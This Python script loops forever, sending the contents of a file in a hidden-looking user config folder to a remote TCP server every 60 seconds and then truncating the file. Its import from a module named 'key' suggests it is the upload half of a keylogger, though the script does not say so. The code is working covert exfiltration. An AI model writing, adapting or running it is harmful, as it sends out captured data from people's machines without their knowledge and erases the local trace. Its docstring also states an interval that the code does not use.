import socket
import time
import os
from key import FILE_PATH,SERVER_IP_ADDR,SERVER_PORT

SERVER_IP_ADDR = '192.168.29.220'
SERVER_PORT = 2121
FILE_PATH = r"C:\Users\imclp\.cnfig\imclp.txt"

def send_file_to_server(file_path, server_host, server_port, interval):
    """
    Sends a file to the server every 600 seconds or 10 minutes.
    
    Args:
        file_path (str): Path to the file to be sent.
        server_host (str): Server IP address.
        server_port (int): Server port.
        interval (int): Time interval in seconds between consecutive transfers.
    """
    if not os.path.isfile(file_path):
        print(f"Error: File '{file_path}' does not exist.")
        return
    
    while True:
        try:
            print(f"Connecting to server at {server_host}:{server_port}...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((server_host, server_port))
                print(f"Connected. Sending file: {file_path}")
                
                with open(file_path, 'r') as file:
                    for line in file:
                        print(line)
                        client_socket.sendall(line.encode('utf-8'))
                
                # Send termination signal to indicate the end of the file
                client_socket.sendall(b"END")
                print("File sent successfully.")
                
                # Receive acknowledgment from the server
                response = client_socket.recv(1024).decode('utf-8')
                print(f"Server response: {response}")
        
        except Exception as e:
            print(f"An error occurred: {e}")
        
        print(f"Waiting {interval} seconds before the next transfer...")
        with open(file_path, 'w') as file:
            pass
        time.sleep(interval)

# Uncomment below to run the client
# send_file_to_server(file_path='text_file.txt', server_host='192.168.1.100', server_port=2121)
if __name__ == '__main__':
    send_file_to_server(FILE_PATH, SERVER_IP_ADDR, SERVER_PORT, 60)
